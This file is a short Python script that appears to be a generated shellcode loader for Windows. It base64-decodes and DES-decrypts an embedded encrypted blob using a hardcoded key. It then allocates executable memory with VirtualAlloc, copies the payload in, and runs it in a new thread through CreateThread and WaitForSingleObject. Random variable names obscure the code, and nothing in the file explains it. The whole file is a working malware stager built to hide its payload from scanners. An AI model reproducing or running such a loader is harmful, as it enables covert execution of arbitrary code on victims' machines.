from Crypto.Cipher import DES
import base64
import ctypes as IJrblpDR
yRCdaItYRos = DES.new('3YCsuJ^4', DES.MODE_CBC, 'FgfGXxFg')
JsFvHyPomiG = 'D4r8FyU6sXuKDqntCyZ4nPIveiL5wW/kY5L5T59HHdX+9mkbPsD5Gu0oEvezrIQaJRtobiTGn85/mUnZ5psXjfECtVVB22Buwf8a4PqzGxSnHcFwUIFSBwFnBYOLE+zsW/gGUXGPPRoVnv/toQwCRboFPKdKqTyIUyf1C3D9K7S/z2NBF04YIVovpPvxc42gVBn/t7op3ly45BWB4g/7xvn5XZtr/E552psdSKjnW6etMkyzsuwlmdg+AeXR1bf+1Hn1MGvSMRjBXBQ5lLOJpfY3ISlB59Qlr6n+lYv/PUlswykRxffAq8qFtXn79CoaRY7sCn1GUIhUsevdOBqFx/Y71Ut1DeXlz4FJT2JrMNnqDqAPEL216C1/IGSy/9dLvyfX3+AnvTIBd/gm20MWA9BgcYGm2i6hkioMitR+DbRuFJ0P66KqQ9jSzOv4v6XK'
WxYSFNHfUpU = base64.b64decode(JsFvHyPomiG)
WxYSFNHfUpU = yRCdaItYRos.decrypt(WxYSFNHfUpU)
sTKRAoeIArykhc = IJrblpDR.windll.kernel32.VirtualAlloc(IJrblpDR.c_int(0),IJrblpDR.c_int(len(WxYSFNHfUpU)),IJrblpDR.c_int(0x3000),IJrblpDR.c_int(0x40))
IJrblpDR.windll.kernel32.RtlMoveMemory(IJrblpDR.c_int(sTKRAoeIArykhc),WxYSFNHfUpU,IJrblpDR.c_int(len(WxYSFNHfUpU)))
rgryPhs = IJrblpDR.windll.kernel32.VirtualProtect(IJrblpDR.c_int(sTKRAoeIArykhc),IJrblpDR.c_int(len(WxYSFNHfUpU)),IJrblpDR.c_int(0x20),IJrblpDR.byref(IJrblpDR.c_uint32(0)))
TgIQbgkMEYAkRPN = IJrblpDR.windll.kernel32.CreateThread(IJrblpDR.c_int(0),IJrblpDR.c_int(0),IJrblpDR.c_int(sTKRAoeIArykhc),IJrblpDR.c_int(0),IJrblpDR.c_int(0),IJrblpDR.pointer(IJrblpDR.c_int(0)))
IJrblpDR.windll.kernel32.WaitForSingleObject(IJrblpDR.c_int(TgIQbgkMEYAkRPN),IJrblpDR.c_int(-1))